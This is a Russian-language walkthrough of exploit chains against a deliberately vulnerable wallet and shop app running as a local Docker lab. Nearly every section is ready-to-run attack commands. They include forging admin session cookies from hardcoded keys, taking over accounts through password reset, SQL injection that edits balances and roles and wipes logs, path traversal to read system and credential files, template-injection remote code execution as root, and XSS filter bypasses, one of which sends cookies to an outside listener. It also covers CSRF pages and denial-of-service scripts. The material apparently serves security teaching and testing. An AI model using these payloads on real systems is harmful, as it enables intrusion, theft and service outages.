# Пошаговые цепочки — как получается каждый пункт

Разбор шпаргалки из SECURITY.md: что именно нажимать и в каком порядке, чтобы
получить каждый эффект. Всё проверено на живом стенде, те же цепочки автоматически
гоняют скрипты из `poc/` (запуск всех сразу: `python3 poc/run_all.py`).

## Что делает каждый скрипт

Все скрипты — на питоне, нужен только `python3` и поднятый стенд.

| Скрипт | Запуск | Что тыкает (куда уходят запросы) | Что доказывает |
|---|---|---|---|
| `lib.py` | не запускается | — | общий код: вход `POST /login`, запросы с выводом `→`/`←`, запросы в базу через `docker exec … psql`, сборка заказа `cart/add → quote → confirm` |
| `stage_access.py` | `python3 poc/stage_access.py` | `POST /login`, `GET /admin/secrets`, `GET /gateway/sms`, `POST /password/forgot`, `GET /mail`, `GET /password/reset?rid=`, `POST /password/reset`, `GET /logout`, `POST /register`, плюс `UPDATE users` в базе | 8 пунктов: вход → OW-28/OW-35 фейк админ-кука без пароля → OW-26/OW-27 захват пароля жертвы через сброс → OW-34 прямая смена пароля в базе → OW-28 обход блокировки → OW-23 перебор без ограничений → OW-29 кука живёт после logout → OW-24 пустой хеш при длинном пароле |
| `stage_money.py` | `python3 poc/stage_money.py` | `POST /transfer/new` (сумма = SQL, плюс переполнение OW-31), `POST /pay/replay` (HMAC считается сам), `POST /cart/add` → `quote` → `confirm` (старая котировка OW-02, чаевые max int64 → 0 OW-01), `POST /orders/N/return` (`qty=100` и `qty=-1`), `GET/POST /orders/N`, `/cancel`, `POST /cashier/topup` (минус OW-19) | 10 пунктов: OW-14 инъекция записью → OW-17 повтор платежа одной подписью → OW-05 печатание денег → OW-05 увод денег → OW-04 отмена чужого заказа → OW-02 оплата по старой котировке → OW-01 покупка за 0 → OW-31 переполнение парсера → OW-19 отрицательное пополнение → OW-11 ложный успех корзины |
| `stage_data.py` | `python3 poc/stage_data.py` | `POST /checkout/quote` с `{{exec "…"}}` и `GET /orders/N/preview?renderer=classic`, `POST /transfer/new` с подзапросом (дамп хешей), `POST /statements/export` c `../../../../`, `GET /mail`, `GET /operations/N` + `GET /api/ops/feed`, `psql` напрямую | 7 пунктов: OW-08 RCE → OW-14 дамп паролей → OW-09 чтение файлов → OW-27 вся почта → OW-13 чужие операции → OW-34 прямой доступ к базе |
| `stage_xss.py` | `python3 poc/stage_xss.py` | `GET /history?q=<пейлоад>` (4 обхода санитайзера), `POST /tips/new` с payload, `GET /tips/received?id=N`, `POST /login` ради заголовка `Set-Cookie` | 7 шагов: OW-12 эталон (что фильтр режет) → OW-12 обход регистром → OW-12 обход чужим событием → OW-12 обход через HTML-сущности → OW-12 сохранённый XSS в чаях → OW-30 кука без HttpOnly |
| `run_all.py` | `python3 poc/run_all.py` [`--dos`] | запускает `stage_access` → `stage_money` → `stage_data` → `stage_xss`; с `--dos` добавляет `03_slowloris.py` и `04_unlimited_db_pool.py` | прогон всех цепочек по порядку, останавливается на первом провале |
| `01_forged_session_and_payment.py` | `python3 poc/01_… <base> replay <op> <amount> <to>` | подделка куки сессии и `POST /pay/replay` | OW-35/OW-28/OW-17: сессия и платёж подделываются без сервера |
| `02_default_db_creds.py` | `python3 poc/02_default_db_creds.py` | `psql` на `db:5432` с `wallet/wallet` из контейнера в compose-сети | OW-34: пароль базы лежит в репозитории |
| `03_slowloris.py` | `python3 poc/03_… <base> <сек> <сокеты>` | открытые TCP-сокеты без `\r\n\r\n` | OW-33: нет `ReadHeaderTimeout`, соединения держатся вечно |
| `04_unlimited_db_pool.py` | `python3 poc/04_… <base> <параллельно> <сек>` | `POST /transfer/new` с `pg_sleep` через инъекцию | OW-32: пул БД не ограничен, сервис уходит в отказ |

Скрипты ничего не меняют в коде приложения: они только ходят по HTTP и по базе
стенда. Всё, что портят данные стенда (пароли, роли, балансы), восстанавливается
командой сброса в конце файла.

Подготовка, одна на всё:

```bash
# стенд
docker compose up -d --build

# вход, куки кладём в файл — все запросы ниже ходят с ним
jar=/tmp/ow.jar
curl -s -c $jar -b $jar -X POST -d 'login=ivanov&password=workplace1&return=/' \
  -o /dev/null http://localhost:18081/login

# база, пароль wallet/wallet лежит в docker-compose.yml
db() { docker exec office-wallet-main-db-1 psql -U wallet -d wallet -tAc "$1"; }
```

---

## Доступы

### 1. OW-34/OW-26: Сменить пароль любому и зайти

Способ А — напрямую в базе (самый быстрый):

```bash
# у pgcrypto в этой базе нет, поэтому готовый хеш не генерируем, а копируем:
# ставим жертве пароль, который мы и так знаем (ivanoв/workplace1)
db "UPDATE users SET password_hash=(SELECT password_hash FROM users WHERE login='ivanov') WHERE login='adminw';"
# → UPDATE 1

# заходим под жертвой
curl -s -c /tmp/v.jar -b /tmp/v.jar -X POST \
  -d 'login=adminw&password=workplace1&return=/' -o /dev/null \
  -w '%{http_code}\n' http://localhost:18081/login
# → 302, кука ow_session получена — админка открыта
```

Способ Б — через SQL-инъекцию в форме перевода (без доступа к базе, нужна только
учётка). Хеш bcrypt не содержит одинарных кавычек, поэтому вставляется как есть:

```bash
HASH=$(db "SELECT password_hash FROM users WHERE login='ivanov'")
curl -s -b $jar -X POST \
  --data-urlencode 'recipient=petrova' \
  --data-urlencode "amount_rub=1;UPDATE users SET password_hash='$HASH' WHERE login='adminw';--" \
  --data-urlencode 'memo=x' -o /dev/null \
  http://localhost:18081/transfer/new
```

Способ В — цепочка сброса, полностью через приложение: см. пункт 3 ниже.

Восстановить исходный пароль после теста:

```bash
db "UPDATE users SET password_hash='$СТАРЫЙ_ХЕШ' WHERE login='adminw';"
```

### 2. OW-28/OW-35: Любая роль без пароля (фейк админ-куки)

Шаги:

1. Достаём ключ — он в статике, отдаётся любому, кто открыл страницу:
   `SESSION_KEY=office-wallet-session-key` (ищем в `app/static/wallet.js`,
   видно и в `/proc/1/environ`, см. «Читать любые файлы»).
2. Считаем подпись от строки `uid:роль` (сервер делает ровно то же при входе,
   `app/internal/app/auth.go:46-50`):

```bash
SIG=$(printf '6:admin' | openssl dgst -sha256 -hmac 'office-wallet-session-key' -hex | sed 's/.*= //')
COOKIE="ow_session=ow.6.admin.$SIG"
# id=6 — это adminw в сиде; для иванова (id=1) будет ow.1.admin.$SIG
```

3. Открываем админские страницы:

```bash
curl -s -H "Cookie: $COOKIE" http://localhost:18081/admin/secrets | head -5   # служебные ключи
curl -s -H "Cookie: $COOKIE" http://localhost:18081/gateway/sms               # коды сброса всех
```

Почему работает: роль входит в подписываемую строку, но после проверки подписи
с базой не сверяется (`auth.go:40-42`), а ключ — константа в репозитории.

### 3. OW-26/OW-27: Сброс пароля жертвы целиком

1. Просим сброс — письмо и SMS уходят в общие ящики:

```bash
curl -s -X POST -d 'login=adminw' -o /dev/null http://localhost:18081/password/forgot
```

2. Забираем ссылку из почты — `/mail` отдаёт весь outbox любому вошедшему:

```bash
curl -s -b $jar http://localhost:18081/mail | grep -o '/password/reset?rid=[0-9]*' | head -1
# → /password/reset?rid=10
```

3. Забираем код — два варианта:
   - подделанной админ-кукой из пункта 2: `curl -s -H "Cookie: $COOKIE" http://localhost:18081/gateway/sms`,
     ищем строку `код подтверждения сброса 172929 (заявка #10)`;
   - или сразу из базы: `db "SELECT sms_code FROM password_resets ORDER BY id DESC LIMIT 1;"`.

4. Меняем пароль:

```bash
curl -s -X POST -d 'rid=10&sms_code=172929&password=Hack1234' -o /dev/null \
  -w '%{http_code}\n' http://localhost:18081/password/reset
# → 302 на /login
```

5. Заходим: `login=adminw&password=Hack1234`.

Почему работает: ссылка видна чужому, код — в открытом SMS-шлюзе, срок у кода
не проверяется и лимита попыток нет (`handlers_auth.go:146`).

### 4. OW-23: Брут без ограничений

```bash
for i in 1 2 3 4 5 6; do
  curl -s -o /dev/null -w "попытка $i → HTTP %{http_code}\n" -X POST \
    -d 'login=ivanov&password=nope&return=/' http://localhost:18081/login
done
```

Все ответы одинаковые (200, страница с ошибкой), ни одной 429/блокировки.
Дальше вход настоящим паролем проходит — счётчика попыток нет вообще
(`handlers_auth.go:33-65`). Код сброса шестизначный и гоняется так же:
запросили сброс, перебираете `sms_code` от 000000 до 999999 — задержки нет.

### 5. OW-28: Обход блокировки

```bash
db "UPDATE users SET blocked=TRUE WHERE login='ivanov';"   # бухгалтер нажал «заблокировать»

# заблокированный входит как ни в чём не бывало:
curl -s -c /tmp/b.jar -b /tmp/b.jar -X POST \
  -d 'login=ivanov&password=workplace1&return=/' -o /dev/null -w '%{http_code}\n' \
  http://localhost:18081/login
# → 302, сессия получена

# и старая сессия тоже продолжает работать:
curl -s -b $jar -o /dev/null -w '%{http_code}\n' http://localhost:18081/
# → 200
```

Проверки `blocked` при чтении сессии нет (`auth.go:17-44`), а в `handlers_auth.go`
проверки нет вообще. Блокировка действует только на получателя перевода.

---

### 6. OW-29: выход не отзывает сессию

```bash
# кража куки (например, XSS из пункта 26):
COOKIE=$(curl -s -c - -X POST -d 'login=ivanov&password=workplace1&return=/' \
  http://localhost:18081/login | grep ow_session | awk '{print $NF}')

# жертва нажала «Выход»:
curl -s -b /tmp/v.jar -o /dev/null -w '%{http_code}\n' http://localhost:18081/logout
# → 302, браузеру поставлена пустая кука

# украденная кука всё ещё работает:
curl -s -H "Cookie: ow_session=$COOKIE" -o /dev/null -w '%{http_code}\n' \
  http://localhost:18081/
# → 200, кабинет открыт
```

`logout` только ставит пустую куку в браузере (`auth.go:64-66`): на сервере нет
ни списка сессий, ни срока действия — кука живёт, пока живёт подпись. Отозвать
украденную сессию нельзя ничем, кроме смены SESSION_KEY.

---

### 7. OW-24: ошибка хеширования при регистрации

```bash
# пароль длиннее 72 байт — bcrypt падает:
curl -s -X POST -d "login=ow24&email=a@b.c&password=$(printf 'A%.0s' {1..100})" \
  http://localhost:18081/register -o /dev/null -w '%{http_code}\n'
# → 302, «Аккаунт создан»

# в базе пустой хеш:
db "SELECT login, length(password_hash) FROM users WHERE login='ow24';"
# → ow24|0

# войти нельзя вообще:
curl -s -X POST -d "login=ow24&password=$(printf 'A%.0s' {1..100})" \
  http://localhost:18081/login -o /dev/null -w '%{http_code}\n'
# → 200, «Неверный логин или пароль»
```

`hash, _ := hashPassword(pass)` (`handlers_auth.go:80`) молча глотает ошибку
bcrypt, и в базу пишется пустая строка. Аккаунт создаётся, а пароль не
сохранён: войти или восстановить его невозможно — нерабочий аккаунт-зомби.

---

## Деньги

### 8. OW-05: Печатать деньги (возврат qty=100)

1. Оформляем заказ на 450₽ (товар 1):

```bash
curl -s -b $jar -X POST -d 'product_id=1' -o /dev/null http://localhost:18081/cart/add
Q=$(curl -s -b $jar -X POST -d 'item_comment=обычный' http://localhost:18081/checkout/quote \
  | grep -o 'name="quote_id" value="[0-9]*"' | grep -o '[0-9]*')
LOC=$(curl -s -b $jar -X POST -d "quote_id=$Q" -o /dev/null -w '%{redirect_url}' \
  http://localhost:18081/checkout/confirm)
ORD=${LOC##*/}    # номер заказа в конце адреса
```

2. Возврат с завышенным количеством:

```bash
curl -s -b $jar -X POST -d 'qty=100' -o /dev/null \
  -w '%{http_code} %{redirect_url}\n' http://localhost:18081/orders/$ORD/return
```

3. Смотрим баланс: `refund = total × qty` = 450₽ × 100 = **+45000₽**
   (`handlers_shop.go:350-363`). qty не ограничен ничем — хоть 1000000.

### 9. OW-05: Уводить деньги (возврат qty=-1)

То же, что пункт 8, но `qty=-1`:

```bash
curl -s -b $jar -X POST -d 'qty=-1' -o /dev/null http://localhost:18081/orders/$ORD/return
```

Деньги уходят со счёта, возврат всё равно проводится: `refund = -total`.
В `anomaly_log` пишется строка `return_neg` — и ничего больше, никто не смотрит.

### 10. OW-17: Повторять платежи (подпись без nonce)

Способ А — кнопкой из интерфейса: на странице `/history` у каждой операции лежит
готовая форма с подписью (`history.html:28-35`), поле `to_login` меняет получателя
мимо подписанного. Жмёте «Повтор» сколько угодно раз.

Способ Б — сами считаете подпись (ключ в статике `PAYMENT_KEY=office-wallet-pay-key`):

```bash
# формат: op_id:amount_kop:recipient — те же данные лежат в форме на /history
SIG=$(printf '2:300:3' | openssl dgst -sha256 -hmac 'office-wallet-pay-key' -hex | sed 's/.*= //')

# платёж проводится, и проводится снова, и снова:
for i in 1 2 3; do
  curl -s -b $jar -X POST -d "op_id=2&amount_kop=300&recipient=3&sig=$SIG" \
    -o /dev/null -w "повтор $i → %{http_code}\n" http://localhost:18081/pay/replay
done
```

Почему работает: в подписи нет ни nonce, ни срока, ни привязки к сессии
(`handlers_money.go:368-401`), проверяется только совпадение хеша.

### 11. OW-14: Менять балансы и роли напрямую (SQL-инъекция)

Сумма не парсится → сервер выполняет её как SQL (`handlers_money.go:172-180`),
lib/pq при Exec без параметров гоняет несколько команд подряд:

```bash
# себе +5000₽
curl -s -b $jar -X POST \
  --data-urlencode 'recipient=petrova' \
  --data-urlencode 'amount_rub=1;UPDATE users SET balance_kop=balance_kop+500000 WHERE id=1;--' \
  --data-urlencode 'memo=x' -o /dev/null http://localhost:18081/transfer/new

# назначить себе роль admin
curl -s -b $jar -X POST \
  --data-urlencode 'recipient=petrova' \
  --data-urlencode "amount_rub=1;UPDATE users SET role='admin' WHERE login='ivanov';--" \
  --data-urlencode 'memo=x' -o /dev/null http://localhost:18081/transfer/new

# подчистить журнал после себя
curl -s -b $jar -X POST \
  --data-urlencode 'recipient=petrova' \
  --data-urlencode 'amount_rub=1;DELETE FROM anomaly_log;--' \
  --data-urlencode 'memo=x' -o /dev/null http://localhost:18081/transfer/new
```

После правки роли перелогиниться — роль в куке перетирает базу (`auth.go:40-42`).

### 12. OW-04: Отменять чужие заказы

```bash
# смотрим чужой заказ — проверки владельца при просмотре нет (handlers_shop.go:284-301)
curl -s -b $jar http://localhost:18081/orders/1 | grep -o 'Заказ #1'

# отменяем — проверки владельца при отмене тоже нет (handlers_shop.go:304-329)
curl -s -b $jar -X POST -o /dev/null -w '%{http_code} %{redirect_url}\n' \
  http://localhost:18081/orders/1/cancel
```

Чужой заказ уходит в `cancelled`, деньги возвращаются на счёт **его владельца**
(вы этого не видите, но баланс жертвы растёт), выдача и учёт рассинхронизируются.

---

### 13. OW-02: платим по старой котировке

```bash
# корзина: только снек за 270₽
curl -s -b $jar -X POST -d 'product_id=3' http://localhost:18081/cart/add -o /dev/null

# котировка фиксирует 270₽:
QID=$(curl -s -b $jar -X POST -d 'tip_kop=0' http://localhost:18081/checkout/quote \
  | grep -o 'name="quote_id" value="[0-9]*"' | grep -o '[0-9]*')

# ДО оплаты в корзину падает кружка за 600₽:
curl -s -b $jar -X POST -d 'product_id=4' http://localhost:18081/cart/add -o /dev/null

# платим по котировке:
curl -s -b $jar -X POST -d "quote_id=$QID" http://localhost:18081/checkout/confirm \
  -o /dev/null -w '%{redirect_url}\n'
# → /orders/N

db "SELECT total_kop, lines_json FROM orders ORDER BY id DESC LIMIT 1;"
# → 27000 | [{...снек...},{...кружка...}]
```

Подтверждение списывает `total` из котировки, а строки заказа берёт из живой
корзины (`handlers_shop.go:218-250`). Расхождение пишется в `anomaly_log`
и никого не волнует: заплатил 270₽ — получил 870₽ товаров.

---

### 14. OW-01: переполнение чаевых — покупка за 0

```bash
curl -s -b $jar -X POST -d 'product_id=3' http://localhost:18081/cart/add -o /dev/null

# tip_kop = max int64, сумма + чаевые переполняют int64 в минус:
curl -s -b $jar -X POST -d 'tip_kop=9223372036854775807' \
  http://localhost:18081/checkout/quote | grep -o 'name="quote_id" value="[0-9]*"'

db "SELECT total_kop, tip_kop FROM checkout_quotes ORDER BY id DESC LIMIT 1;"
# → 0|9223372036854775807   ← chargeKop обнулился проверкой < 0
```

`chargeKop = сумма + tip` (`handlers_shop.go:190-196`) переполняется в
отрицательное, проверка `chargeKop < 0` ставит 0 — товар уходит даром.

---

### 15. OW-31: переполнение рублей в копейки

```bash
# 4.6 квинтиллиона рублей:
curl -s -b $jar -X POST -d 'recipient=petrova&amount_rub=4611686018427387914' \
  http://localhost:18081/transfer/new -o /dev/null -w '%{redirect_url}\n'
# → /transfer/confirm?draft_id=N

db "SELECT amount_kop FROM transfer_drafts ORDER BY id DESC LIMIT 1;"
# → 1000    ← вместо 4.6 квинтиллионов рублей 10 рублей
```

`parseRubToKop` умножает рубли на 100 без проверки границ (`render.go:52-80`):
`ri*100` выходит за int64 и молча заворачивается. Ни сумма, ни границы парсер
не проверяет — из нелепого ввода получается «рабочая» сумма.

---

### 16. OW-19: отрицательное кассовое пополнение

```bash
# роль кассира (admin тоже проходит за кассира):
db "UPDATE users SET role='cashier' WHERE login='ivanov';"   # и перелогин

curl -s -b $jar -X POST -d 'login=petrova&amount_rub=-100' \
  http://localhost:18081/cashier/topup -o /dev/null -w '%{http_code}\n'
# → 302, flash «Пополнение выполнено»

db "SELECT balance_kop FROM users WHERE login='petrova';"
# → баланс уменьшился на 10000 коп

db "SELECT kind, amount_kop FROM operations ORDER BY id DESC LIMIT 1;"
# → topup|-10000
```

`cashierTopup` проверяет только `amount != 0` (`handlers_accounting.go:26-37`),
знак не проверяется вовсе: минусовая сумма проводится как обычное пополнение
и списывает деньги у жертвы.

---

### 17. OW-11: ложный успех корзины и неактивный товар

```bash
# несуществующий товар:
curl -s -b $jar -X POST -d 'product_id=999' http://localhost:18081/cart/add \
  -o /dev/null -w '%{http_code}\n' -D - | grep -i flash
# → «Добавлено в корзину», но:

db "SELECT count(*) FROM cart_items WHERE user_id=1;"
# → 0     ← товар молча пропал (FK ошибка проглочена)

# неактивный товар:
db "UPDATE products SET active=FALSE WHERE id=4;"
curl -s -b $jar -X POST -d 'product_id=4' http://localhost:18081/cart/add -o /dev/null
curl -s -b $jar http://localhost:18081/cart | grep -o 'Кружка'
# → Кружка   ← active не проверяется нигде, товар и продаётся
```

`cartAdd` (`handlers_shop.go:123-135`) не проверяет ни существование товара,
ни его `active`, ошибку FK проглатывает и всё равно пишет flash успеха.
Витрина фильтрует по `active=TRUE`, а корзина и покупка — нет.

---

## Данные

### 18. OW-14: Дамп всех паролей

Способ А — SQL-инъекцией на чтение: подзапрос возвращает строку, приведение к
bigint падает, текст ошибки с содержимым печатается в форме:

```bash
curl -s -b $jar -X POST \
  --data-urlencode 'recipient=petrova' \
  --data-urlencode 'amount_rub=(SELECT string_agg(login||chr(61)||password_hash, chr(10)) FROM users)' \
  --data-urlencode 'memo=x' http://localhost:18081/transfer/new \
  | grep -o '\$2a\$[^&<]*'
# → 6 строк login=хеш
```

Способ Б — просто в базу (пароль в docker-compose.yml):

```bash
db "SELECT login, role, password_hash FROM users ORDER BY id;"
```

### 19. OW-09: Читать любые файлы

```bash
curl -s -b $jar -X POST --data-urlencode 'filename=../../../../etc/passwd' \
  http://localhost:18081/statements/export | head -3

curl -s -b $jar -X POST --data-urlencode 'filename=../../../../proc/1/environ' \
  http://localhost:18081/statements/export | tr '\0' '\n' | grep -E 'KEY|DATABASE_URL'
# → PAYMENT_KEY=... DATABASE_URL=... SESSION_KEY=...
```

Фильтр снимает `../` только один раз, результат после `filepath.Join` не проверяется
(`handlers_shop.go:449-461`). То же самое читает RCE-оболочка из пункта 20.

### 20. OW-08: RCE — выполнить команду на сервере

```bash
curl -s -b $jar -X POST -d 'product_id=1' -o /dev/null http://localhost:18081/cart/add
Q=$(curl -s -b $jar -X POST \
  --data-urlencode 'item_comment={{exec "id"}} {{exec "hostname"}} {{exec "env"}}' \
  http://localhost:18081/checkout/quote | grep -o 'name="quote_id" value="[0-9]*"' | grep -o '[0-9]*')
LOC=$(curl -s -b $jar -X POST -d "quote_id=$Q" -o /dev/null -w '%{redirect_url}' \
  http://localhost:18081/checkout/confirm)
ORD=${LOC##*/}

# шаблон с комментарием выполняется при открытии превью:
curl -s -b $jar "http://localhost:18081/orders/$ORD/preview?renderer=classic" \
  | grep -E 'uid=|_KEY=|DATABASE_URL=' | sed 's/<[^>]*>//g'
# → uid=0(root) gid=0(root) ... SESSION_KEY=... PAYMENT_KEY=... DATABASE_URL=...
```

Дальше в той же оболочке: `{{exec "cat /etc/shadow"}}`, `{{exec "sh -c \"...\""}}`,
сеть внутри кластера, сканирование, закладка в `/app/exports` (видна всем в
`/ops/journal`). Контейнер работает от root (`handlers_shop.go:388-420`).

### 21. OW-27: Все почты и письма

```bash
curl -s -b $jar http://localhost:18081/mail
# → таблица всего mail_outbox: кому, тема, текст, когда — без фильтра по адресату
```

Тут же лежат ссылки на сброс паролей (пункт 3) и любые служебные письма
(`handlers_auth.go:181-200`).

### 22. OW-13: Чужие операции (токены /api/ops/feed)

```bash
# без подписи — отказ:
curl -s -b $jar -o /dev/null -w '%{http_code}\n' http://localhost:18081/operations/52
# → 403

# feed сам выдаёт подписи на 30 последних операций всех пользователей:
curl -s -c $jar -b $jar http://localhost:18081/api/ops/feed | head -c 200
# → [{"id":55,...,"t":"5ad92e0a..."}, ...]  и куки op_grant_<id> в файле $jar

# теперь та же операция открывается:
curl -s -b $jar -o /dev/null -w '%{http_code}\n' http://localhost:18081/operations/52
# → 200, в ответе тип, сумма, отправитель, получатель, комментарий
```

Почему: feed раздаёт `op_grant` (`handlers_money.go:97-127`), а проверка сверяет
подпись только с uid смотрящего (`:78-89`) — то есть feed выдаёт валидные ключи
от чужих записей.

---

## Отказ в обслуживании

### 23. OW-32: Положить сервис (отказ БД)

```bash
python3 poc/04_unlimited_db_pool.py http://localhost:18081 150 45
```

150 параллельных запросов с `amount_rub=1;SELECT pg_sleep(45);--` через ту же
инъекцию из пункта 11. Пул соединений не ограничен (`server.go:25`), у postgres
`max_connections=100` — база засыпает, обычный вход в этот момент отдаёт
`500 pq: sorry, too many clients already`. Через 45 секунд всё само
восстанавливается, повторять можно бесконечно.

### 24. OW-33: Копить соединения (медленные заголовки)

```bash
python3 poc/03_slowloris.py http://localhost:18081 30 300
```

Открывает соединения и не заканчивает заголовки: сервер держит их все, потому что
`ReadHeaderTimeout` не выставлен (`server.go:61-66`). Пока скрипт висит — fd
растут, соединения не закрываются ни на секунду.

### 25. (см. «Обход блокировки», пункт 5)

---

## Через браузер жертвы

### 26. OW-12: Кража сессии (XSS)

Автоматически: `python3 poc/stage_xss.py` (7 шагов). Руками — ниже.

Фильтр `sanitizeSearchDisplay` (`render.go`) вырезает ровно пять строк в нижнем
регистре: `script`, `onerror`, `javascript:`, `onload`, `onmouseover`. Он стоит
в двух местах: поиск в истории (`handlers_money.go:60`) и комментарий чаевых
(`handlers_money.go:292`). Оба стока выводят HTML как есть (`template.HTML`),
кука без HttpOnly (`auth.go:59`).

**Эталон — что фильтр реально режет.** В поле «Поиск» на `/history`:

```
<script>alert(1)</script>
```

После «Найти» в строке `Результаты по запросу:` остаётся `<>alert(1)</>` —
слово `script` вырезано, тег сломан. Это единственный случай, когда фильтр работает.

**Обход 1 — регистр.** `strings.Index` чувствителен к регистру, теги в HTML — нет:

```
<ScRiPt>document.title='PWNED'</ScRiPt>
<ScRiPt>alert(document.cookie)</ScRiPt>
<ScRiPt>new Image().src='http://localhost:9999/?'+document.cookie</ScRiPt>
```

Проверка без выполнения JS: `curl -b $jar -G --data-urlencode 'q=<ScRiPt>alert(1)</ScRiPt>' http://localhost:18081/history | grep -F '<ScRiPt>'`
— пейлоад в ответе байт в байт, экранирования нет. Первый вариант (заголовок
вкладки) видно сразу: после «Найти» вкладка называется **PWNED**.

**Обход 2 — событие, которого нет в списке.** В списке `onerror`/`onload`/`onmouseover`,
а `onfocus` отсутствует и не вырезается вообще, плюс `autofocus` запускает его
без единого действия жертвы:

```
<input autofocus onfocus=alert(document.cookie)>
<img src=x oNerroR=alert(document.cookie)>
```

Второй вариант — тот же `onerror`, но в смешанном регистре.

**Обход 3 — HTML-сущности.** Тут тонкость: заменить на сущность одну букву `j`
недостаточно, потому что в строке `javascript:` есть подстрока `script`, и она
всё равно вырезается (в ответе получится `&#106;ava:alert(...)`). Ломать надо
обе части:

```
<iframe src="&#106;ava&#115;cript:alert(document.cookie)"></iframe>
<a href="&#106;ava&#115;cript:alert(document.cookie)">кликни</a>
```

Фильтр не находит ни `javascript:`, ни `script`, а браузер декодирует сущности
в атрибуте уже после токенизатора — схема собирается заново и исполняется.

**Сохранённый вариант (без ссылки, без клика).** Чаевые в поле «Комментарий»
(`/tips/new`), туда же любой из пейлоадов выше:

```
<ScRiPt>alert(document.cookie)</ScRiPt>
```

Проверка, что сохранилось без экранирования:

```bash
curl -b $jar -X POST --data-urlencode 'recipient=ivanov' --data-urlencode 'amount_rub=10' \
  --data-urlencode 'comment=<ScRiPt>alert(document.cookie)</ScRiPt>' \
  -o /dev/null http://localhost:18081/tips/new
curl -b $jar http://localhost:18081/tips/received | grep -o '/tips/received?id=[0-9]*' | head -1
# → /tips/received?id=87, и в ответе по этому адресу пейлоад нетронутым
```

Карточка рендерит комментарий как `template.HTML` (`handlers_money.go:344`),
список — безопасно через `{{.Preview}}`, поэтому открывать надо именно `?id=N`.

**Почему это даёт сессию.** Кука ставится без `HttpOnly` (`auth.go:59`), значит
проверить можно так:

```bash
curl -s -D - -o /dev/null -X POST -d 'login=ivanov&password=workplace1&return=/' \
  http://localhost:18081/login | grep -i set-cookie
# → Set-Cookie: ow_session=ow.1.…; Path=/; SameSite=Lax   (без HttpOnly)
```

`document.cookie` отдаёт `ow_session` целиком → сессия жертвы ваша → дальше всё,
что умеет она: переводы, заказы, её роль, `/mail`, `/gateway/sms`.

Чтобы заработало на жертве, а не на себе: ссылка вида
`http://localhost:18081/history?q=<ScRiPt>…</ScRiPt>` (нужен клик жертвы) или
сохранённый комментарий чаевых (откроет сама, по ссылке из списка).

### 27. OW-40: CSRF

Формы без токенов, Origin/Referer не проверяются, часть действий меняется по GET:

```html
<!-- жертва открыла вашу страницу — заказ уже отменён -->
<img src="http://localhost:18081/orders/1/received" style="display:none">

<!-- или перевод с её сессией -->
<form action="http://localhost:18081/transfer/new" method="post" id="f">
  <input name="recipient" value="petrova">
  <input name="amount_rub" value="1000">
  <input name="memo" value="спасибо">
</form>
<script>document.getElementById('f').submit()</script>
```

С XSS из пункта 26 CSRF вообще не нужен — скрипт работает напрямую.

---

## Что нельзя

Зайти «из ниоткуда» без единого действия — нужна либо своя учётка (её дают
`ivanov/workplace1` или любой сотруднический доступ), либо прямой доступ к базе
или сети. Но одной учётки хватает на всё остальное: пункты 2-22 из неё и
вырастают.

---

## Сброс стенда после всех тестов

```bash
docker compose down -v && docker compose up -d --build
```

Флаг `-v` обязателен: без него переписанные балансы, пароли и роли останутся.
